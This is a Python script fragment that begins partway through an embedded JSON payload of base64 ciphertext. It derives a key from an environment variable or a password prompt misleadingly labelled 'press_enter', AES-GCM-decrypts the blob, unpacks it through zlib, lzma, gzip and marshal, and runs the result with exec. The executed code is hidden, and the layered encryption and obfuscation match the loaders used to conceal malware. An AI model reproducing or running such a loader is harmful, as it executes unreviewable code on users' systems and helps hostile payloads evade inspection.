gE9h6tCO8uqRuF8IbP0oiCmf522Fne8C2MFnG4ZWfg912iuUvZZlk8DYnSUkj2g5rgypfgKA0FaAzkwrZRiCRFbBV1+dfCyPgWmAn76YY4gyngooGuINR67+pAPqlxwCzDwTwk3kKumxmCMhnYPFMSnDEFnlJIyfO9civzGaA8nlohuQrNnuLWSpdfvXqPXDQ1k01KGN/vhOkcj+KRaKnt4gFGa4W9hXt6Nb6hsRV6MeCIDpmLR4EtUSbrfnAqSi0L6zyIXgZa5MDsN6DYCWWTJEnKF95qp5TqUq6xIHlAsGvXjkKQMAozSn7sPhltSq39t+M1S0YZ8AmNIzH78zot2meP7uINZzbX3YxfrS1G2a3Nj69mM8DQC/+Pmvnia5LcqISgdVs6Pv0mUx5l7gOhF6Xo7P55+olqw0kUA1MWUkIMazEVr/gGuFHUARi8Aq+BZHS9nWZl5oE9TfSn3OR2995so4XmMpcz9tPiB6zKrlWIOKD8/r+jMduFsqXFQzDnMI0yADReXXdZ05oVQHqaE1yIeBG9akCj6ZY6jJ3RCP8sN9AUUmcdZFGUybO2loR8TPxvV4c/RZx6RYskYEmTgeKMkWjZxvB1GOF+LnoVA8aFT0jnE1Q0wCPZeUiOcRjFiJYc0PWuaoOtiiGiPZo/RhBxHuGwcmjMKVYu6sOgDrKeobWzlzSUVrpDLe9ZFLgatWY953nDH1riY14Wk9zwqS9vQ0/9oqvdTNDAFiVO3rsgs5JZFQ=", "wrapped_key": "amif5aDACbo4qGfbUUBPRblF+G0pksEWo4O4vtvV5WY=", "wrap_nonce": "5KrJWRyo5suetFze", "wrap_tag": "PUHzIbT38cKg+kmPh+ScgQ=="}')
if payload.get("mode") != "password":
    print("Bad payload")
    sys.exit(1)

salt = base64.b64decode(payload["salt"])
iters = int(payload["kdf_iters"])
nonce = base64.b64decode(payload["nonce"])
tag = base64.b64decode(payload["tag"])
ciphertext = base64.b64decode(payload["ciphertext"])

wrapped_key = base64.b64decode(payload["wrapped_key"])
wrap_nonce = base64.b64decode(payload["wrap_nonce"])
wrap_tag = base64.b64decode(payload["wrap_tag"])

# get password
pw = os.environ.get("ENCPW")
if pw is None:
    pw = getpass.getpass("press_enter") 
if isinstance(pw, str):
    pw = pw.encode()

kek = PBKDF2(pw, salt, dkLen=32, count=iters, hmac_hash_module=SHA256)

# unwrap symmetric key
wrap_cipher = AES.new(kek, AES.MODE_GCM, nonce=wrap_nonce)
key = wrap_cipher.decrypt_and_verify(wrapped_key, wrap_tag)

# decrypt payload
cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
decompressed = cipher.decrypt_and_verify(ciphertext, tag)

# multi-decompress (reverse of your multi_compress)
lzmaed = zlib.decompress(decompressed)
gzipped = lzma.decompress(lzmaed)
marshaled = gzip.decompress(gzipped)
codeobj = marshal.loads(marshaled)

# execute
exec(codeobj, globals())
